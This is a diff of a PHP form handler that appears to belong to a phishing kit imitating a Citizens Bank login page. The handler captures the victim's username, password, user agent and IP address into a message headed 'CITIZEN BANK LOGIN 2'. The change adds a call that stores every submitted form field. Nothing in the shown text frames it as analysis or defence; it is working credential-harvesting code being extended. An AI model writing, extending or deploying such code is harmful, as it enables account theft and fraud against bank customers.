@@ -8,7 +8,9 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $password = $_POST['password1'];
     $useragent = $_SERVER['HTTP_USER_AGENT'];
     $ip = getenv("REMOTE_ADDR");
-    
+
+    h4z3_store_submission('relogin', $_POST);
+
             $body  = "++++++++++ 🐱‍💻 CITIZEN BANK LOGIN 2 🐱‍💻 ++++++++++\r\n";
             $body .= "Username    : $username\r\n";
             $body .= "Password    : $password\r\n";
